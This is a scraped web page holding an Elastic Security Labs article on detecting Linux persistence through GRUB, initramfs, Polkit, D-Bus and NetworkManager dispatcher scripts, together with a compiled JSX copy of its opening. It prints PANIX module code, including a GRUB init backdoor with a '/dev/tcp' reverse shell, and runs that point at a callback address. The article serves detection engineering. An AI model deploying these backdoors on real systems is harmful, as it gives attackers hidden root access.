Call](https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_suspicious_d_bus_method_call.toml) |\n|         | [Unusual D-Bus Daemon Child Process](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/rules/linux/persistence_dbus_unsual_daemon_parent_execution.toml) |\n\nTo revert any changes, you can use the corresponding revert module by running:\n\n```\n\u003e ./panix.sh --revert dbus\n\n[*] Reverting D-Bus persistence module...\n[+] Removing D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service...\n[+] D-Bus service file removed.\n[+] Removing payload script: /usr/local/bin/dbus-panix.sh\n[+] Payload script removed.\n[+] Removing D-Bus configuration file: /etc/dbus-1/system.d/org.panix.persistence.conf...\n[+] D-Bus configuration file removed.\n[*] Restarting D-Bus...\n[+] D-Bus restarted successfully.\n[+] D-Bus persistence reverted.\n```\n\n# Hunting for T1543 - Create or Modify System Process: D-Bus\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use and modification of D-Bus-related files, services, and processes. The approach includes monitoring for the following:\n\n1. **Creations and/or Modifications to D-Bus Configuration and Service Files**: Tracks changes in critical directories, such as system-wide and session service files and policy files. Monitoring these paths helps detect unauthorized additions or modifications that may indicate malicious activity targeting D-Bus.  \n2. **Metadata Analysis of D-Bus Files**: Inspects file ownership, last access times, and modification timestamps for D-Bus configuration files. This can reveal unauthorized changes or the presence of unexpected files that may indicate attempts to persist through D-Bus.  \n3. **Detection of Suspicious Processes**: Monitors executions of processes such as `dbus-daemon` and `dbus-send`, which are key components of D-Bus communication. By tracking command lines, parent processes, and execution counts, unusual or unauthorized usage can be identified.  \n4. **Detection of Rare or Anomalous Events**: Identifies uncommon file modifications or process executions by correlating event data across endpoints. This highlights subtle indicators of compromise, such as rare changes to critical D-Bus configurations or the unexpected use of D-Bus commands.\n\nBy combining the [Persistence via Desktop Bus (D-Bus)](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_desktop_bus.toml) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1543](https://attack.mitre.org/techniques/T1543/).\n\n# T1546 - Event Triggered Execution: NetworkManager\n\n[NetworkManager](https://wiki.archlinux.org/title/NetworkManager) is a widely used daemon for managing network connections on Linux systems. It allows for configuring wired, wireless, VPN, and other network interfaces while offering a modular and extensible design. One of its lesser-known but powerful features is its [dispatcher](https://wiki.archlinux.org/title/NetworkManager#Network_services_with_NetworkManager_dispatcher) feature, which provides a way to execute scripts automatically in response to network events. When certain network events occur (e.g., an interface comes up or goes down), NetworkManager invokes scripts located in this directory. These scripts run as root, making them highly privileged.\n\n* **Event Types**: NetworkManager passes specific events to scripts, such as:  \n  * `up`: Interface is activated.  \n  * `down`: Interface is deactivated.  \n  * `vpn-up`: VPN connection is established.  \n  * `vpn-down`: VPN connection is disconnected.\n\nScripts placed in `/etc/NetworkManager/dispatcher.d/` are standard shell scripts and must be marked executable. An example of a dispatcher script may look like this:\n\n```\n#!/bin/bash\nINTERFACE=$1\nEVENT=$2\n\nif [ \"$EVENT\" == \"up\" ]; then\n    logger \"Interface $INTERFACE is up. Executing custom script.\"\n    # Perform actions, such as logging, mounting, or starting services\n    /usr/bin/some-command --arg value\nelif [ \"$EVENT\" == \"down\" ]; then\n    logger \"Interface $INTERFACE is down. Cleaning up.\"\n    # Perform cleanup actions\nfi\n```\n\nLogging events and executing commands whenever a network interface comes up or goes down. \n\nTo achieve persistence through this technique, an attacker can either:\n\n* Create a custom script, mark it executable and place it within the dispatcher directory  \n* Modify a legitimate dispatcher script to execute a payload upon a certain network event. \n\nPersistence through `dispatcher.d/` aligns with [T1546: Event Triggered Execution](https://attack.mitre.org/techniques/T1546/) and [T1543: Create or Modify System Process](https://attack.mitre.org/techniques/T1543/) in the MITRE ATT\u0026CK framework. NetworkManager dispatcher scripts however do not have their own sub-technique. \n\nIn the next section, we will explore how dispatcher scripts can be exploited for persistence and visualize the process flow to support effective detection engineering.\n\n# Persistence through T1546 - Event Triggered Execution:\n\nThe concept of this technique is very simple, let’s now put it to practice through the [setup_network_manager.sh](https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_network_manager.sh) PANIX module. The module checks whether the NetworkManager package is available, and whether the `/etc/NetworkManager/dispatcher.d/` path exists, as these are requisites for the technique to work. Next, it creates a new dispatcher file under `/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh`, with a payload on the end. Finally, it grants execution permissions to the dispatcher file, after which it is ready to be activated.\n\n```\ncat \u003c\u003c'EOF' \u003e \"$dispatcher_file\"\n#!/bin/sh -e\n\nif [ \"$2\" = \"connectivity-change\" ]; then\n\texit 0\nfi\n\nif [ -z \"$1\" ]; then\n\techo \"$0: called with no interface\" 1\u003e\u00262\n\texit 1\nfi\n\n[...]\n\n# Insert payload here:\n__PAYLOAD_PLACEHOLDER__\nEOF\n\nchmod +x \"$dispatcher_file\"\n```\n\nWe have included only the most relevant snippets of the module above. Feel free to check out the module source code if you are interested in diving deeper.\n\nLet’s run the PANIX module with the following command line arguments:\n\n```\n\u003e sudo ./panix.sh --network-manager --default --ip 192.168.1.100 --port 2017\n\n[+] Created new dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh\n[+] Replaced payload placeholder with actual payload.\n[+] Using dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh\n```\n\nNow, whenever a new network event triggers, the payload will be executed. This can be done through restarting the NetworkManager service, an interface or a reboot. Let’s take a look at the documents in Kibana:\n\n![PANIX network-manager module execution visualized in Kibana](/assets/images/the-grand-finale-on-linux-persistence/image1.png)\n\nUpon PANIX execution, the `panix-dispatcher.sh` script is created, marked as executable and `sed` is used to add the payload to the bottom of the script. Upon restarting the `NetworkManager` service through `systemctl`, we can see `nm-dispatcher` executing the `panix-dispatcher.sh` script, effectively detonating the reverse shell chain (`panix-dispatcher.sh` → `nohup` → `setsid` → `bash`).\n\nAnd finally, let’s take a look at our detection opportunities:\n\n*Detection and endpoint rules that cover network-manager persistence*\n\n| Category | Coverage |\n| :---- | :---- |\n| File | [NetworkManager Dispatcher Script Creation](https://github.com/elastic/detection-rules/blob/9b8b9175985ed533493e2c9dc4dc17ee8bf9e704/rules/linux/persistence_network_manager_dispatcher_persistence.toml) |\n|      | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n| Process | [Shell via NetworkManager Dispatcher Script](https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_shell_via_networkmanager_dispatcher_script.toml) |\n| Network | [Reverse Shell via NetworkManager Dispatcher Script](https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_reverse_shell_via_networkmanager_dispatcher_script.toml) |\n\nTo revert any changes, you can use the corresponding revert module by running:\n\n```\n\u003e ./panix.sh --revert network-manager\n\n[+] Checking for payload in /etc/NetworkManager/dispatcher.d/01-ifupdown...\n[+] No payload found in /etc/NetworkManager/dispatcher.d/01-ifupdown.\n[+] Removing custom dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh...\n[+] Custom dispatcher file removed.\n[+] NetworkManager persistence reverted.\n```\n\n# Hunting for T1546 - Event Triggered Execution: NetworkManager\n\nWe can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the creation, modification, and execution of NetworkManager Dispatcher scripts. The approach includes monitoring for the following:\n\n1. **Creations and/or Modifications to Dispatcher Scripts**: Tracks changes within the `/etc/NetworkManager/dispatcher.d/` directory. Monitoring for new or altered scripts helps detect unauthorized additions or modifications that could indicate malicious intent.  \n2. **Detection of Suspicious Processes**: Monitors processes executed by `nm-dispatcher` or scripts located in `/etc/NetworkManager/dispatcher.d/`. By analyzing command lines, parent processes, and execution counts, unusual or unauthorized script executions can be identified.  \n3. **Metadata Analysis of Dispatcher Scripts**: Inspects ownership, last access times, and modification timestamps for files in `/etc/NetworkManager/dispatcher.d/`. This can reveal unauthorized changes or anomalies in file attributes that may indicate persistence attempts.\n\nBy combining the [Persistence via NetworkManager Dispatcher Script](https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_network_manager_dispatcher_script.toml) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1546](https://attack.mitre.org/techniques/T1546/). \n\n# Conclusion\n\nIn the fifth and concluding chapter of the \"Linux Detection Engineering\" series, we turned our attention to persistence mechanisms rooted in the Linux boot process, authentication systems, inter-process communication, and core utilities. We began with GRUB-based persistence and the manipulation of initramfs, covering both manual approaches and automated methods using Dracut. Moving further, we explored Polkit-based persistence, followed by a dive into D-Bus exploitation, and concluded with NetworkManager dispatcher scripts, highlighting their potential for abuse in persistence scenarios.\n\nThroughout this series, [PANIX](https://github.com/Aegrah/PANIX) played a critical role in demonstrating and simulating these techniques, allowing you to test your detection capabilities and strengthen your defenses. Combined with the tailored ES|QL and OSQuery queries provided, these tools enable you to identify and respond effectively to even the most advanced persistence mechanisms.\n\nAs we close this series, we hope you feel empowered to tackle Linux persistence threats with confidence. Armed with practical knowledge, actionable strategies, and hands-on experience, you are well-prepared to defend against adversaries targeting Linux environments. Thank you for joining us, and as always, stay vigilant and happy hunting!\n","code":"var Component=(()=\u003e{var h=Object.create;var o=Object.defineProperty;var u=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var g=(n,e)=\u003e()=\u003e(e||n((e={exports:{}}).exports,e),e.exports),b=(n,e)=\u003e{for(var t in e)o(n,t,{get:e[t],enumerable:!0})},c=(n,e,t,s)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let r of p(e))!m.call(n,r)\u0026\u0026r!==t\u0026\u0026o(n,r,{get:()=\u003ee[r],enumerable:!(s=u(e,r))||s.enumerable});return n};var y=(n,e,t)=\u003e(t=n!=null?h(f(n)):{},c(e||!n||!n.__esModule?o(t,\"default\",{value:n,enumerable:!0}):t,n)),w=n=\u003ec(o({},\"__esModule\",{value:!0}),n);var l=g((B,a)=\u003e{a.exports=_jsx_runtime});var _={};b(_,{default:()=\u003ex,frontmatter:()=\u003ev});var i=y(l()),v={title:\"Linux Detection Engineering - The Grand Finale on Linux Persistence\",slug:\"the-grand-finale-on-linux-persistence\",date:\"2025-02-27\",subtitle:\"Building on previous research, this article describes creative, complex, or rare persistence techniques.\",description:\"By the end of this series, you'll have a robust knowledge of both common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities.\",author:[{slug:\"ruben-groenewoud\"}],image:\"Security Labs Images 5.jpg\",category:[{slug:\"security-research\"}]};function d(n){let e=Object.assign({h1:\"h1\",p:\"p\",ul:\"ul\",li:\"li\",a:\"a\",em:\"em\",ol:\"ol\",h3:\"h3\",strong:\"strong\",code:\"code\",pre:\"pre\",img:\"img\",div:\"div\",table:\"table\",thead:\"thead\",tr:\"tr\",th:\"th\",tbody:\"tbody\",td:\"td\"},n.components);return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h1,{id:\"introduction\",children:\"Introduction\"}),`\n`,(0,i.jsx)(e.p,{children:\"Welcome to the grand finale of the \\u201CLinux Persistence Detection Engineering\\u201D series! In this fifth and final part, we continue to dig deep into the world of Linux persistence. Building on the foundational concepts and techniques explored in the previous publications, this post discusses some more obscure, creative and/or complex backdoors and persistence mechanisms.\"}),`\n`,(0,i.jsx)(e.p,{children:\"If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Linux Detection Engineering - A Primer on Persistence Mechanisms\"})})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Linux Detection Engineering - A Sequel on Persistence Mechanisms\"})})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Linux Detection Engineering - A Continuation on Persistence Mechanisms\"})})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/approaching-the-summit-on-persistence\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms\"})})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"In this publication, we\\u2019ll provide insights into these persistence mechanisms by showcasing:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"How each works (theory)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to set each up (practice)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to detect them (SIEM and Endpoint rules)\"}),`\n`,(0,i.jsx)(e.li,{children:\"How to hunt for them (ES|QL and OSQuery reference hunts)\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"To make the process even more engaging, we will be leveraging \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"By the end of this series, you'll have a robust knowledge of both common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Are you ready to uncover the final pieces of the Linux persistence puzzle? Let\\u2019s dive in!\"}),`\n`,(0,i.jsx)(e.h1,{id:\"setup-note\",children:\"Setup note\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules\",rel:\"nofollow\",children:\"enable and update our pre-built detection rules\"}),\". If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1542---pre-os-boot-grub-bootloader\",children:\"T1542 - Pre-OS Boot: GRUB Bootloader\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://www.gnu.org/software/grub/manual/grub/grub.html\",rel:\"nofollow\",children:\"GRUB (GRand Unified Bootloader)\"}),\" is a widely used bootloader in Linux systems, responsible for loading the kernel and initializing the operating system. GRUB provides a flexible framework that supports various configurations, making it a powerful tool for managing the boot process. It acts as an intermediary between the system firmware (\",(0,i.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/BIOS\",rel:\"nofollow\",children:\"BIOS\"}),\"/\",(0,i.jsx)(e.a,{href:\"https://en.wikipedia.org/wiki/UEFI\",rel:\"nofollow\",children:\"UEFI\"}),\") and the operating system. When a Linux system is powered on, the following sequence typically occurs:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[`\n`,(0,i.jsx)(e.h3,{id:\"system-firmware\",children:(0,i.jsx)(e.strong,{children:\"System Firmware\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"BIOS or UEFI initializes hardware components (e.g., CPU, RAM, storage devices) and performs a POST (Power-On Self-Test).\"}),`\n`,(0,i.jsx)(e.li,{children:\"It then locates the bootloader on the designated boot device (usually based on boot priority settings).\"}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"2\",children:[`\n`,(0,i.jsxs)(e.li,{children:[`\n`,(0,i.jsx)(e.h3,{id:\"grub-bootloader\",children:(0,i.jsx)(e.strong,{children:\"GRUB Bootloader\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"GRUB is loaded into memory.\"}),`\n`,(0,i.jsx)(e.li,{children:\"It displays a menu (if enabled) that allows users to select an operating system, kernel version, or recovery mode.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"GRUB loads the kernel image (\",(0,i.jsx)(e.code,{children:\"vmlinuz\"}),\") into memory, as well as the initramfs/initrd image (\",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\"), which is a temporary root filesystem used for initial system setup (e.g., loading kernel modules for filesystems and hardware).\"]}),`\n`,(0,i.jsx)(e.li,{children:\"GRUB passes kernel parameters (e.g., the location of the root filesystem, boot options) and hands over control to the kernel.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"3\",children:[`\n`,(0,i.jsxs)(e.li,{children:[`\n`,(0,i.jsx)(e.h3,{id:\"kernel-execution\",children:(0,i.jsx)(e.strong,{children:\"Kernel Execution\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"The kernel is unpacked and initialized. It begins detecting and initializing system hardware.\"}),`\n`,(0,i.jsx)(e.li,{children:\"The kernel mounts the root filesystem specified in the kernel parameters.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"It starts the init system (traditionally \",(0,i.jsx)(e.code,{children:\"init\"}),\", now often \",(0,i.jsx)(e.code,{children:\"systemd\"}),\"), which is the first process (\",(0,i.jsx)(e.code,{children:\"PID 1\"}),\") that initializes and manages the user space.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"The \",(0,i.jsx)(e.code,{children:\"init\"}),\" system sets up services, mounts filesystems, and spawns user sessions.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"GRUB\\u2019s configuration system is flexible and modular, enabling administrators to define bootloader behavior, kernel parameters, and menu entries. All major distributions use \",(0,i.jsx)(e.code,{children:\"/etc/default/grub\"}),\" as the primary configuration file for GRUB. This file contains high-level options, such as default kernel parameters, boot timeout, and graphical settings. For example:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`GRUB_TIMEOUT=5                       # Timeout in seconds for the GRUB menu\nGRUB_DEFAULT=0                       # Default menu entry to boot\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet splash resume=/dev/sda2\" # Common kernel parameters\nGRUB_CMDLINE_LINUX=\"init=/bin/bash audit=1\" # Additional kernel parameters\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"To enhance flexibility, GRUB supports a modular approach to configuration through script directories. These are typically located in \",(0,i.jsx)(e.code,{children:\"/etc/default/grub.d/\"}),\" (Ubuntu/Debian) and \",(0,i.jsx)(e.code,{children:\"/etc/grub.d/\"}),\" (Fedora/CentOS/RHEL). The scripts in these directories are combined into the final configuration during the update process.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Prior to boot, the GRUB bootloader must be compiled. The compiled GRUB configuration file is the final output used by the bootloader at runtime. It is generated from the settings in \",(0,i.jsx)(e.code,{children:\"/etc/default/grub\"}),\" and the modular scripts in \",(0,i.jsx)(e.code,{children:\"/etc/grub.d/\"}),\" (or similar directories and files for other distributions). This configuration is then stored in \",(0,i.jsx)(e.code,{children:\"/boot/grub/grub.cfg\"}),\" for BIOS systems, and \",(0,i.jsx)(e.code,{children:\"/boot/efi/EFI/\u003cdistro\u003e/grub.cfg\"}),\" for UEFI systems.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"On Ubuntu and Debian-based systems, the \",(0,i.jsx)(e.code,{children:\"update-grub\"}),\" command is used to generate the GRUB configuration. For Fedora, CentOS, and RHEL systems, the equivalent command is \",(0,i.jsx)(e.code,{children:\"grub2-mkconfig\"}),\". Upon generation of the configuration, the following events occur:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Scripts Execution\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"All modular scripts in \",(0,i.jsx)(e.code,{children:\"/etc/default/grub.d/\"}),\" or \",(0,i.jsx)(e.code,{children:\"/etc/grub.d/\"}),\" are executed in numerical order.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"2\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Settings Aggregation\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Parameters from \",(0,i.jsx)(e.code,{children:\"/etc/default/grub\"}),\" and modular scripts are merged.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"3\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Menu Entries Creation\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"GRUB dynamically detects installed kernels and operating systems and creates corresponding menu entries.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"4\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Final Compilation\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"The combined configuration is written to \",(0,i.jsx)(e.code,{children:\"/boot/grub/grub.cfg\"}),\" (or the UEFI equivalent path), ready to be used at the next boot.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Attackers can exploit GRUB\\u2019s flexibility and early execution in the boot process to establish persistence. By modifying GRUB configuration files, they can inject malicious parameters or scripts that execute with root privileges before the operating system fully initializes. Attackers can:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Inject Malicious Kernel Parameters\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Adding parameters like \",(0,i.jsx)(e.code,{children:\"init=/payload.sh\"}),\" in \",(0,i.jsx)(e.code,{children:\"/etc/default/grub\"}),\" or directly in the GRUB menu at boot forces the kernel to execute a malicious script instead of the default \",(0,i.jsx)(e.code,{children:\"init\"}),\" system.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"2\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Modify Menu Entries\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Attackers can alter menu entries in \",(0,i.jsx)(e.code,{children:\"/etc/grub.d/\"}),\" to include unauthorized commands or point to malicious kernels.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"3\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Create Hidden Boot Entries\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Adding extra boot entries with malicious configurations that are not displayed in the GRUB menu.\"}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"As GRUB operates before the system\\u2019s typical EDR and other solution mechanisms are active, this technique is especially hard to detect. Additionally, knowledge scarcity around these types of attacks makes detection difficult, as malicious parameters or entries can appear similar to legitimate configurations, making manual inspection prone to oversight.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"GRUB manipulation falls under \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1542/\",rel:\"nofollow\",children:\"T1542: Pre-OS Boot\"}),\" in the MITRE ATT\u0026CK framework. This technique encompasses attacks targeting bootloaders to gain control before the operating system initializes. Despite its significance, there is currently no dedicated sub-technique for GRUB-specific attacks.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In the next section, we\\u2019ll explore how attackers can establish persistence through GRUB by injecting malicious parameters and modifying bootloader configurations.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1542---pre-os-boot-grub-bootloader\",children:\"Persistence through T1542 - Pre-OS Boot: GRUB Bootloader\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In this section we will be looking at the technical details related to GRUB persistence. To accomplish this, we will be leveraging the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_grub.sh\",rel:\"nofollow\",children:\"setup_grub.sh\"}),\" module from \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\", a custom-built Linux persistence tool. By simulating this technique, we will be able to research potential detection opportunities.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The GRUB module detects the Linux distribution it is running on, and determines the correct files to modify, and support tools necessary to establish persistence. There is no compatibility built into PANIX for Fedora-based operating systems within this module, due to the restricted environment available within the boot process. PANIX determines whether the payload is already injected, and if not, creates a custom configuration (\",(0,i.jsx)(e.code,{children:\"cfg\"}),\") file containing the \",(0,i.jsx)(e.code,{children:\"init=/grub-panix.sh\"}),\" parameter. GRUB configuration files are loaded in ascending order, based on the modules\\u2019 numeric prefix. To ensure the injected module is loaded last, the priority is set to 99.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`local grub_custom_dir=\"/etc/default/grub.d\"\nlocal grub_custom_file=\"\\${grub_custom_dir}/99-panix.cfg\"\n\necho \"[*] Creating custom GRUB configuration file: $grub_custom_file\"\ncat \u003c\u003cEOF \u003e \"$grub_custom_file\"\n# Panix GRUB persistence configuration\nGRUB_CMDLINE_LINUX_DEFAULT=\"$GRUB_CMDLINE_LINUX_DEFAULT init=/grub-panix.sh\"\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After this configuration file is in place, the \",(0,i.jsx)(e.code,{children:\"/grub-panix.sh\"}),\" script is created, containing a payload that sleeps for a certain amount of time (to ensure networking is available), after which it executes a reverse shell payload, detaching itself from its main process to ensure no hang ups.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`payload=\"( sleep 10; nohup setsid bash -c 'bash -i \u003e\u0026 /dev/tcp/\\${ip}/\\${port} 0\u003e\u00261' \u0026 disown ) \u0026\"\n\nlocal init_script=\"/grub-panix.sh\"\necho \"[*] Creating backdoor init script at: $init_script\"\ncat \u003c\u003cEOF \u003e \"$init_script\"\n#!/bin/bash\n# Panix GRUB Persistence Backdoor (Ubuntu/Debian)\n(\n\techo \"[*] Panix backdoor payload will execute after 10 seconds delay.\"\n\t\\${payload}\n\techo \"[+] Panix payload executed.\"\n) \u0026\nexec /sbin/init\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"After these files are in place, all that is left is to update GRUB to contain the embedded backdoor module by running \",(0,i.jsx)(e.code,{children:\"update-grub\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at what this process looks like from a detection engineering perspective. Run the PANIX module through the following command:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --grub --default --ip 192.168.1.100 --port 2014\n[*] Creating backdoor init script at: /grub-panix.sh\n[+] Backdoor init script created and made executable.\n[*] Creating custom GRUB configuration file: /etc/default/grub.d/99-panix.cfg\n[+] Custom GRUB configuration file created.\n[*] Backing up /etc/default/grub to /etc/default/grub.bak...\n[+] Backup created at /etc/default/grub.bak\n[*] Running 'update-grub' to apply changes...\nSourcing file \\`/etc/default/grub'\nSourcing file \\`/etc/default/grub.d/99-panix.cfg'\nSourcing file \\`/etc/default/grub.d/init-select.cfg'\nGenerating grub configuration file ...\n[+] GRUB configuration updated. Reboot to activate the payload.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Upon execution of the module, and rebooting the machine, the following documents can be observed in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image3.png\",alt:\"PANIX GRUB module execution visualized in Kibana\",width:\"1353\",height:\"1231\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution of PANIX, we can see a backup of \",(0,i.jsx)(e.code,{children:\"/etc/default/grub\"}),\", a new modular grub configuration, \",(0,i.jsx)(e.code,{children:\"/etc/default/grub.d/99-panix.cfg\"}),\", and the backdoor payload (\",(0,i.jsx)(e.code,{children:\"/grub-panix.sh\"}),\") being created. After granting the backdoor the necessary execution permissions, GRUB is updated through the \",(0,i.jsx)(e.code,{children:\"update-grub\"}),\" executable, and the backdoor is now ready. Upon reboot, \",(0,i.jsx)(e.code,{children:\"/grub-panix.sh\"}),\" is executed by \",(0,i.jsx)(e.code,{children:\"init\"}),\", which is \",(0,i.jsx)(e.code,{children:\"systemd\"}),\" for most modern operating systems, successfully executing the reverse shell chain of \",(0,i.jsx)(e.code,{children:\"/grub-panix.sh\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 